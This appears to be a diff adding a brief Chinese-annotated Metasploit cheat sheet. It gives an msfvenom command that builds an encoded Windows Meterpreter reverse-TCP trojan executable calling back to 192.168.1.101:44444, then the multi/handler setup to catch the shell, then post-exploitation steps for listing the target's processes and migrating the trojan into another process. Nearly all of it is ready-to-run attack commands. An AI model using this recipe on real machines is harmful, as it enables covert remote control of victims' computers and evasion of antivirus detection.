@@ -1,0 +1,21 @@
+1.msfvenom  =  msfpayload + msfencode
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' LHOST=192.168.1.101 LPORT=44444 -f exe > test.exe
+
+-p  msfpayload  
+-e  编码方式
+-i  编码次数
+-b  在生成程序中避免出现的值
+LHOST 本机IP
+LPORT 本机端口
+-f exe 生成EXE格式
+
+
+2.msfconsole  启动metasploit
+use exploit/multi/handler   
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.101  本机IP   与生成木马时的一致
+set LPORT 44444		 本机端口  与生成木马时的一致
+exploit    执行渗透攻击或模块来攻击目标  
+
+ps   查看目标机中的进程
+migrate PID    将木马进程注入到其它进程
